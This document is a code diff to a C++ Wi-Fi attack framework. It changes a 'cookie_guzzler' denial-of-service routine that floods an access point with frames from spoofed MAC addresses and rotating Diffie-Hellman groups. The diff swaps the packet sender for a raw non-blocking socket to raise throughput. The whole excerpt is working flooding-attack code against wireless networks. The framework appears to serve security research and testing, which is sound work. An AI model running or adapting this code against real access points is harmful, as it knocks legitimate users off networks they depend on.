@@ -2,9 +2,11 @@
 
 #include <tins/tins.h>
 #include <unordered_map>
+#include <unistd.h>
 
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
 #include "attacks/DoS_hard/dos_helpers.h"
+#include "attacks/DoS_soft/bl0ck/bl0ck.h"
 #include "config/RunStatus.h"
 #include "ex_program/external_actors/ExternalConn.h"
 #include "ex_program/hostapd/hostapd.h"
@@ -86,7 +88,7 @@ void run_attack(RunStatus &rs) {
 
 	const vector<HWAddress<6>> mac_pool = build_mac_pool(rs, pool_size, use_conn_stas);
 
-	PacketSender sender(attacker.get_mon_iface());
+	auto [fd, sock_addr] = bl0ck_attack::get_unblocking_socket(attacker.get_mon_iface());
 
 	rs.start_observers();
 	log(LogLevel::INFO, "Attack started with {} group(s), pool_size={}", available_groups.size(), pool_size);
@@ -95,7 +97,7 @@ void run_attack(RunStatus &rs) {
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
 	dos_helpers::timed_burst(
-		sender, attack_time, static_cast<size_t>(burst_size), fps_limit, [&]() -> optional<RadioTap> {
+		fd, sock_addr, attack_time, static_cast<size_t>(burst_size), fps_limit, [&]() -> optional<RadioTap> {
 			const auto &sta_mac = mac_pool[frame_idx % mac_pool.size()];
 			const uint16_t gid = random_dh ? available_groups[frame_idx % available_groups.size()] : available_groups.front();
 			frame_idx++;
@@ -103,6 +105,7 @@ void run_attack(RunStatus &rs) {
 		});
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
+	close(fd);
 	ap->disconnect();
 }
 
